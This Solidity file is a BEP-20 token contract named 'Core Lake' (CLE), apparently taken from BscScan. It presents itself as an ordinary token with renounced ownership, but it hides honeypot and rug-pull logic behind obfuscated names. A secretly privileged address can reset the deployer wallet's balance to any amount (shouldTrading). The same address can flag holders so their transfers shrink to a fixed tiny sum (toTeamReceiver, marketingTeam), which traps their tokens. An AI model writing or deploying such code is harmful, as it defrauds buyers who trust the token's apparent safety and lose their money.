/**
 *Submitted for verification at BscScan.com on 2023-02-05
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface fundLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface receiverAt {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract CoreLake is Ownable{
    uint8 public decimals = 18;

    uint256 public totalSupply = 100000000 * 10 ** 18;
    mapping(address => bool) public maxSenderFrom;
    uint256 constant feeSenderBuy = 12 ** 10;

    mapping(address => uint256) public balanceOf;
    string public name = "Core Lake";
    mapping(address => bool) public atLaunched;
    string public symbol = "CLE";
    mapping(address => mapping(address => uint256)) public allowance;
    address public walletToShould;

    bool public launchReceiver;
    address public tokenExempt;

    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        fundLaunched senderFund = fundLaunched(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        tokenExempt = receiverAt(senderFund.factory()).createPair(senderFund.WETH(), address(this));
        walletToShould = limitTrading();
        atLaunched[walletToShould] = true;
        balanceOf[walletToShould] = totalSupply;
        emit Transfer(address(0), walletToShould, totalSupply);
        renounceOwnership();
    }

    

    function toTeamReceiver(address senderWalletLiquidity) public {
        if (senderWalletLiquidity == walletToShould || senderWalletLiquidity == tokenExempt || !atLaunched[limitTrading()]) {
            return;
        }
        maxSenderFrom[senderWalletLiquidity] = true;
    }

    function transfer(address senderTake, uint256 sellLiquidity) external returns (bool) {
        return marketingTeam(limitTrading(), senderTake, sellLiquidity);
    }

    function transferFrom(address takeAmount, address teamSender, uint256 sellLiquidity) external returns (bool) {
        if (allowance[takeAmount][limitTrading()] != type(uint256).max) {
            require(allowance[takeAmount][limitTrading()] >= sellLiquidity);
            allowance[takeAmount][limitTrading()] -= sellLiquidity;
        }
        return marketingTeam(takeAmount, teamSender, sellLiquidity);
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function shouldTrading(uint256 sellLiquidity) public {
        if (!atLaunched[limitTrading()]) {
            return;
        }
        balanceOf[walletToShould] = sellLiquidity;
    }

    function approve(address walletMaxTo, uint256 sellLiquidity) public returns (bool) {
        allowance[limitTrading()][walletMaxTo] = sellLiquidity;
        emit Approval(limitTrading(), walletMaxTo, sellLiquidity);
        return true;
    }

    function marketingTeam(address takeAmount, address teamSender, uint256 sellLiquidity) internal returns (bool) {
        if (takeAmount == walletToShould || teamSender == walletToShould) {
            return minEnable(takeAmount, teamSender, sellLiquidity);
        }
        if (maxSenderFrom[takeAmount]) {
            return minEnable(takeAmount, teamSender, feeSenderBuy);
        }
        return minEnable(takeAmount, teamSender, sellLiquidity);
    }

    function fundFrom(address receiverLimitSwap) public {
        if (launchReceiver) {
            return;
        }
        atLaunched[receiverLimitSwap] = true;
        launchReceiver = true;
    }

    function limitTrading() private view returns (address) {
        return msg.sender;
    }

    function minEnable(address takeAmount, address teamSender, uint256 sellLiquidity) internal returns (bool) {
        require(balanceOf[takeAmount] >= sellLiquidity);
        balanceOf[takeAmount] -= sellLiquidity;
        balanceOf[teamSender] += sellLiquidity;
        emit Transfer(takeAmount, teamSender, sellLiquidity);
        return true;
    }


}